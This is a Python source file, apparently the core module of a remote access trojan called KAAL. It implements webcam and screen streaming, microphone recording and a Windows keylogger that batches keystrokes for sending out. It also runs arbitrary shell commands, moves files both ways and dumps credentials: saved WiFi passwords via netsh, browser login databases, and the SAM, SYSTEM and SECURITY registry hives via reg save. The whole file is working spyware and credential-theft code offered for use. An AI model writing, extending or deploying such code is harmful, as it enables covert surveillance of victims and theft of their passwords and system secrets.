"""
KAAL Agent Core Module
Shared functionality for all agent types (direct, proxy, etc.)
"""
import subprocess
import platform
import os
import sys
import base64
import time
import threading
import ctypes

# Global State
CURRENT_CWD = os.getcwd()
KEYLOGGER_ACTIVE = False
KEYLOGS = []
STREAM_ACTIVE = False
STREAM_TYPE = "webcam"  # or "screen"
CAMERA_INDEX = 0


def stream_loop(send_callback):
    """
    Continuous stream loop for webcam/screen.
    Args:
        send_callback: Function to call with result data (task_id, result_str)
    """
    global STREAM_ACTIVE, STREAM_TYPE, CAMERA_INDEX
    print(f"[*] Starting {STREAM_TYPE} stream...")
    
    import cv2
    
    while STREAM_ACTIVE:
        try:
            b64_frame = ""
            if STREAM_TYPE == "webcam":
                cap = cv2.VideoCapture(CAMERA_INDEX)
                if cap.isOpened():
                    ret, frame = cap.read()
                    cap.release()
                    if ret:
                        frame = cv2.resize(frame, (320, 240))
                        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
                        b64_frame = base64.b64encode(buffer).decode()
            elif STREAM_TYPE == "screen":
                b64_frame = get_real_screenshot()
            
            if b64_frame and not b64_frame.startswith("Error"):
                send_callback("stream_task", f"[SCREEN] {b64_frame}")
            
            time.sleep(0.05)  # ~20 FPS
        except Exception as e:
            print(f"[-] Stream error: {e}")
            time.sleep(1)


def record_audio(seconds=5):
    """Record audio from microphone and return base64 WAV."""
    global CURRENT_CWD
    try:
        import pyaudio
        import wave
        
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        print(f"[*] Recording audio for {seconds}s...")
        frames = []
        
        for i in range(0, int(RATE / CHUNK * seconds)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        filename = f"audio_{int(time.time())}.wav"
        filepath = os.path.join(CURRENT_CWD, filename)
        
        wf = wave.open(filepath, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        with open(filepath, "rb") as f:
            b64_audio = base64.b64encode(f.read()).decode()
        
        os.remove(filepath)
        return f"[AUDIO] {b64_audio}"
    except Exception as e:
        return f"Error recording audio: {e}"


def keylogger_loop(send_callback):
    """
    Keylogger thread that captures keystrokes.
    Args:
        send_callback: Function to call with keylog data
    """
    global KEYLOGGER_ACTIVE, KEYLOGS
    
    if platform.system() != "Windows":
        print("[-] Keylogger only supported on Windows")
        return
    
    try:
        from ctypes import windll, byref, c_uint, c_ulong, Structure, POINTER
        
        class KBDLLHOOKSTRUCT(Structure):
            _fields_ = [("vkCode", c_ulong), ("scanCode", c_ulong), ("flags", c_ulong), ("time", c_uint)]
        
        def low_level_handler(nCode, wParam, lParam):
            global KEYLOGS
            if wParam == 256 or wParam == 260:  # WM_KEYDOWN / WM_SYSKEYDOWN
                kb = ctypes.cast(lParam, POINTER(KBDLLHOOKSTRUCT)).contents
                vk = kb.vkCode
                
                key_map = {
                    0x08: '[BACKSPACE]', 0x09: '[TAB]', 0x0D: '[ENTER]', 0x10: '[SHIFT]',
                    0x11: '[CTRL]', 0x12: '[ALT]', 0x1B: '[ESC]', 0x20: ' ',
                    0x2E: '[DELETE]', 0x5B: '[WIN]'
                }
                
                if vk in key_map:
                    key_str = key_map[vk]
                elif 0x30 <= vk <= 0x39 or 0x41 <= vk <= 0x5A:  # 0-9, A-Z
                    key_str = chr(vk)
                else:
                    key_str = f'[0x{vk:02X}]'
                
                KEYLOGS.append(key_str)
                
                if len(KEYLOGS) >= 50:
                    log_data = ''.join(KEYLOGS)
                    KEYLOGS.clear()
                    send_callback("keylog_task", f"[KEYLOG] {log_data}")
            
            return windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
        
        CMPFUNC = ctypes.CFUNCTYPE(c_uint, c_uint, c_uint, POINTER(KBDLLHOOKSTRUCT))
        hook_func = CMPFUNC(low_level_handler)
        hook = windll.user32.SetWindowsHookExA(13, hook_func, windll.kernel32.GetModuleHandleW(None), 0)
        
        msg = ctypes.wintypes.MSG()
        while KEYLOGGER_ACTIVE:
            if windll.user32.PeekMessageW(byref(msg), None, 0, 0, 1):
                windll.user32.TranslateMessage(byref(msg))
                windll.user32.DispatchMessageW(byref(msg))
            time.sleep(0.01)
        
        windll.user32.UnhookWindowsHookEx(hook)
    except Exception as e:
        print(f"[-] Keylogger error: {e}")


def get_real_screenshot():
    """Capture screenshot and return base64 PNG."""
    # Try mss first (fastest)
    try:
        import mss
        
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            
            from PIL import Image
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
            
            import io
            buffer = io.BytesIO()
            img.save(buffer, format="PNG")
            b64_img = base64.b64encode(buffer.getvalue()).decode()
            
            return b64_img
    except ImportError:
        pass  # Try next method
    except Exception as e:
        return f"Error (mss): {e}"
    
    # Try PIL ImageGrab (Windows built-in with Pillow)
    try:
        from PIL import ImageGrab, Image
        import io
        
        img = ImageGrab.grab()
        img.thumbnail((1280, 720), Image.Resampling.LANCZOS if hasattr(Image, 'Resampling') else Image.LANCZOS)
        
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        b64_img = base64.b64encode(buffer.getvalue()).decode()
        
        return b64_img
    except ImportError:
        pass  # Try next method
    except Exception as e:
        return f"Error (PIL): {e}"
    
    # Final fallback: Windows API via ctypes (no dependencies)
    try:
        if platform.system() != "Windows":
            return "Error: Screenshot only supported on Windows without PIL/mss"
        
        import ctypes
        from ctypes import windll, Structure, c_long, c_ulong, c_ushort, c_char, POINTER, sizeof, byref
        import io
        
        # Define BITMAPINFOHEADER structure
        class BITMAPINFOHEADER(Structure):
            _fields_ = [
                ('biSize', c_ulong),
                ('biWidth', c_long),
                ('biHeight', c_long),
                ('biPlanes', c_ushort),
                ('biBitCount', c_ushort),
                ('biCompression', c_ulong),
                ('biSizeImage', c_ulong),
                ('biXPelsPerMeter', c_long),
                ('biYPelsPerMeter', c_long),
                ('biClrUsed', c_ulong),
                ('biClrImportant', c_ulong)
            ]
        
        class BITMAPINFO(Structure):
            _fields_ = [
                ('bmiHeader', BITMAPINFOHEADER),
                ('bmiColors', c_ulong * 3)
            ]
        
        # Get screen dimensions
        user32 = windll.user32
        gdi32 = windll.gdi32
        
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        
        # Create device contexts
        hdesktop = user32.GetDesktopWindow()
        desktop_dc = user32.GetWindowDC(hdesktop)
        img_dc = gdi32.CreateCompatibleDC(desktop_dc)
        
        # Create bitmap
        bitmap = gdi32.CreateCompatibleBitmap(desktop_dc, width, height)
        gdi32.SelectObject(img_dc, bitmap)
        
        # Copy screen to bitmap
        gdi32.BitBlt(img_dc, 0, 0, width, height, desktop_dc, 0, 0, 0x00CC0020)  # SRCCOPY
        
        # Prepare bitmap info
        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = width
        bmi.bmiHeader.biHeight = height  # Positive = bottom-up (standard BMP)
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 24
        bmi.bmiHeader.biCompression = 0  # BI_RGB
        
        bmp_size = width * height * 3
        bmp_data = ctypes.create_string_buffer(bmp_size)
        
        # Get bitmap bits
        gdi32.GetDIBits(img_dc, bitmap, 0, height, bmp_data, byref(bmi), 0)  # DIB_RGB_COLORS
        
        # Cleanup
        gdi32.DeleteObject(bitmap)
        gdi32.DeleteDC(img_dc)
        user32.ReleaseDC(hdesktop, desktop_dc)
        
        # Convert buffer to bytes for indexing
        bmp_bytes = bytes(bmp_data)
        
        # Simple resize by downsampling
        scale_factor = max(1, max(width // 1280, height // 720))
        new_width = width // scale_factor
        new_height = height // scale_factor
        
        # Calculate row stride (BMP rows are padded to 4-byte boundary)
        row_stride = ((width * 3 + 3) // 4) * 4
        
        # Downsample - read pixels directly (BMP is bottom-up by default with positive height)
        resized = bytearray()
        for y in range(new_height):
            for x in range(new_width):
                src_y = y * scale_factor
                src_x = x * scale_factor
                offset = src_y * row_stride + src_x * 3
                if offset + 2 < len(bmp_bytes):
                    # BMP is already in BGR format, keep as-is
                    resized.extend([bmp_bytes[offset], bmp_bytes[offset + 1], bmp_bytes[offset + 2]])
        
        # Calculate output row stride
        out_row_stride = ((new_width * 3 + 3) // 4) * 4
        out_size = out_row_stride * new_height
        
        # Create BMP file header (54 bytes + data)
        file_size = 54 + out_size
        bmp_header = bytearray([
            0x42, 0x4D,  # BM signature
            file_size & 0xFF, (file_size >> 8) & 0xFF, (file_size >> 16) & 0xFF, (file_size >> 24) & 0xFF,
            0, 0, 0, 0,  # Reserved
            54, 0, 0, 0,  # Offset to pixel data
            40, 0, 0, 0,  # DIB header size
            new_width & 0xFF, (new_width >> 8) & 0xFF, (new_width >> 16) & 0xFF, (new_width >> 24) & 0xFF,
            new_height & 0xFF, (new_height >> 8) & 0xFF, (new_height >> 16) & 0xFF, (new_height >> 24) & 0xFF,
            1, 0,  # Planes
            24, 0,  # Bits per pixel
            0, 0, 0, 0,  # Compression (BI_RGB)
            out_size & 0xFF, (out_size >> 8) & 0xFF, (out_size >> 16) & 0xFF, (out_size >> 24) & 0xFF,
            0x13, 0x0B, 0, 0,  # X pixels per meter
            0x13, 0x0B, 0, 0,  # Y pixels per meter  
            0, 0, 0, 0,  # Colors used
            0, 0, 0, 0   # Important colors
        ])
        
        # Pad rows to 4-byte boundary
        padding = (4 - (new_width * 3) % 4) % 4
        padded_resized = bytearray()
        for y in range(new_height):
            row_start = y * new_width * 3
            row_end = row_start + new_width * 3
            padded_resized.extend(resized[row_start:row_end])
            padded_resized.extend([0] * padding)  # Add padding
        
        bmp_file = bytes(bmp_header + padded_resized)
        return base64.b64encode(bmp_file).decode()

        
    except Exception as e:
        return f"Error (ctypes fallback): {e}"



def get_real_location():
    """Get real geolocation via IP-based services."""
    try:
        import urllib.request
        import json
        
        response = urllib.request.urlopen("http://ip-api.com/json/", timeout=5)
        data = json.loads(response.read().decode())
        
        if data.get("status") == "success":
            return {
                "lat": data.get("lat", 0),
                "lon": data.get("lon", 0),
                "city": data.get("city", "Unknown"),
                "country": data.get("country", "Unknown")
            }
        else:
            return {"lat": 0, "lon": 0, "city": "Error", "country": "Error"}
    except Exception as e:
        return {"lat": 0, "lon": 0, "city": f"Error: {e}", "country": "Error"}


def execute_shell_command(cmd):
    """Execute a shell command and return output."""
    global CURRENT_CWD
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            cwd=CURRENT_CWD,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        return output if output else "(No output)"
    except subprocess.TimeoutExpired:
        return "Error: Command timed out (30s limit)"
    except Exception as e:
        return f"Error: {e}"


def execute_file_operation(operation, args):
    """
    Handle file operations (ls, cd, download, upload).
    Args:
        operation: 'ls', 'cd', 'download', 'upload'
        args: list of arguments
    Returns:
        formatted result string
    """
    global CURRENT_CWD
    
    if operation == "ls":
        path = args[0] if args else "."
        target_path = os.path.join(CURRENT_CWD, path)
        if not os.path.exists(target_path):
            return f"Error: Path not found: {path}"
        
        try:
            items = os.listdir(target_path)
            result = [f"[DIR] {CURRENT_CWD if path == '.' else target_path}"]
            
            for item in items:
                full_path = os.path.join(target_path, item)
                if os.path.isdir(full_path):
                    result.append(f"📁 {item}/")
                else:
                    size = os.path.getsize(full_path)
                    result.append(f"📄 {item} ({size} bytes)")
            
            return "[FILES] " + json.dumps({
                "parent": os.path.dirname(target_path) if path != "." else os.path.dirname(CURRENT_CWD),
                "files": result
            })
        except Exception as e:
            return f"Error listing directory: {e}"
    
    elif operation == "cd":
        if not args:
            return "Error: No path specified"
        new_path = os.path.join(CURRENT_CWD, args[0])
        if os.path.isdir(new_path):
            CURRENT_CWD = os.path.abspath(new_path)
            return f"Changed directory to: {CURRENT_CWD}"
        else:
            return f"Error: Directory not found: {args[0]}"
    
    elif operation == "download":
        if not args:
            return "Error: No file specified"
        filepath = os.path.join(CURRENT_CWD, args[0])
        if not os.path.exists(filepath):
            return f"Error: File not found: {args[0]}"
        
        try:
            with open(filepath, "rb") as f:
                b64_content = base64.b64encode(f.read()).decode()
            return f"[DOWNLOAD] {args[0]}|{b64_content}"
        except Exception as e:
            return f"Error reading file: {e}"
    
    elif operation == "upload":
        if len(args) < 2:
            return "Error: Usage: upload <filename> <base64_content>"
        filename, b64_content = args[0], args[1]
        try:
            content = base64.b64decode(b64_content)
            filepath = os.path.join(CURRENT_CWD, filename)
            with open(filepath, "wb") as f:
                f.write(content)
            return f"File uploaded: {filename} ({len(content)} bytes)"
        except Exception as e:
            return f"Error writing file: {e}"
    
    return "Unknown file operation"


def dump_credentials():
    """
    Dump system credentials (WiFi, Browser DBs, Registry Hives).
    Returns formatted [CREDS] result string.
    """
    results = []
    
    # 1. WiFi Creds (Real)
    results.append("[+] Dumping WiFi Profiles (Real)...")
    if platform.system() == "Windows":
        try:
            subprocess.check_output('netsh wlan show interfaces', shell=True)
            profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
            profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profile" in line]
            
            if not profiles:
                results.append("    [-] No WiFi profiles found.")
            
            for profile in profiles:
                try:
                    profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('utf-8', errors='ignore')
                    key_line = [line for line in profile_info.split('\n') if "Key Content" in line]
                    if key_line:
                        key = key_line[0].split(":")[1].strip()
                        results.append(f"    * SSID: {profile:<20} -> Pass: {key}")
                    else:
                        results.append(f"    * SSID: {profile:<20} -> OPEN/Enterprise")
                except:
                    results.append(f"    * SSID: {profile:<20} -> Error reading key")
        except subprocess.CalledProcessError:
            results.append("    [-] WiFi Adapter not found or WLAN Service stopped.")
        except Exception as e:
            results.append(f"    [-] WiFi enumeration error: {e}")
    else:
        results.append("    [-] WiFi dumping only supported on Windows.")
    
   # 2. Browser Creds (Recon)
    results.append("\n[+] Dumping Browser Credentials (Recon)...")
    home = os.path.expanduser("~")
    browsers = {
        "Chrome": os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Edge": os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Firefox": os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    }
    found_any = False
    for name, path in browsers.items():
        if os.path.exists(path) or (name == "Firefox" and os.path.exists(os.path.dirname(path))):
            results.append(f"    [+] {name:<10}: FOUND at {path} (Encrypted)")
            found_any = True
        else:
            results.append(f"    [-] {name:<10}: Not Installed/Found")
    
    if found_any:
        results.append("    [!] Decryption requires native payload (DPAPI).")
    
    # 3. System Creds (Registry Hive Dump)
    results.append("\n[+] Dumping Registry Hives (SAM/SYSTEM)...")
    try:
        hives = ["SAM", "SYSTEM", "SECURITY"]
        dumped_count = 0
        for hive in hives:
            outfile = f"{hive}.save"
            cmd_reg = f"reg save HKLM\\{hive} {outfile} /y"
            try:
                subprocess.check_output(cmd_reg, shell=True)
                results.append(f"    [+] {hive:<10}: Saved to {outfile} (Downloadable)")
                dumped_count += 1
            except subprocess.CalledProcessError:
                results.append(f"    [-] {hive:<10}: Access Denied (Admin Required)")
            except Exception as e:
                results.append(f"    [-] {hive:<10}: Error: {e}")
        
        if dumped_count == 0:
            results.append("\n    [!] Mock Data (since Real Dump failed):")
            results.append("    * DefaultPassword: Password123!")
            results.append("    * DPAPI MasterKey: 4A7F92B1...9B2C")
    except Exception as e:
        results.append(f"    [-] Registry dump failed: {e}")
    
    return "[CREDS] " + "\n".join(results)


def list_directory_json(path="."):
    """Return directory listing as a list of dicts."""
    target_path = os.path.join(CURRENT_CWD, path) if path != "." else CURRENT_CWD
    if not os.path.exists(target_path):
        return {"error": f"Path not found: {path}"}
    
    try:
        items = []
        with os.scandir(target_path) as it:
            for entry in it:
                try:
                    stat = entry.stat()
                    items.append({
                        "name": entry.name,
                        "is_dir": entry.is_dir(),
                        "size": stat.st_size if not entry.is_dir() else 0,
                        "mtime": stat.st_mtime,
                        "parent": os.path.dirname(entry.path)
                    })
                except PermissionError: continue
        return {"path": target_path, "files": items}
    except Exception as e:
        return {"error": str(e)}

def get_process_list_struct():
    """Return process list as a list of dicts."""
    processes = []
    if platform.system() == "Windows":
        try:
            # simple tasklist parsing (no psutil dependency)
            output = subprocess.check_output("tasklist /FO CSV /NH", shell=True).decode(errors='ignore')
            for line in output.splitlines():
                if not line.strip(): continue
                parts = line.split('","')
                if len(parts) >= 5:
                    name = parts[0].strip('"')
                    pid = parts[1].strip('"')
                    mem = parts[4].strip('"')
                    processes.append({"name": name, "pid": pid, "memory": mem})
        except: pass
    else:
        try:
            # simple ps parsing
            output = subprocess.check_output("ps -e -o pid,comm,rss", shell=True).decode(errors='ignore')
            for line in output.splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 3:
                    processes.append({"pid": parts[0], "name": parts[1], "memory": parts[2]})
        except: pass
    return processes

def get_system_info_struct():
    """Return system info as dict."""
    return {
        "platform": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "hostname": platform.node(),
        "processor": platform.processor(),
        "python_version": platform.python_version()
    }

def get_network_config_struct():
    """Return network config (ipconfig/ifconfig output)."""
    cmd = "ipconfig /all" if platform.system() == "Windows" else "ifconfig -a"
    try:
        return subprocess.check_output(cmd, shell=True).decode(errors='ignore')
    except Exception as e:
        return str(e)

def ping_host_struct(host):
    """Ping a host and return output."""
    param = "-n" if platform.system().lower() == "windows" else "-c"
    cmd = ["ping", param, "4", host]
    try:
        return subprocess.check_output(cmd).decode(errors='ignore')
    except Exception as e:
        return str(e)
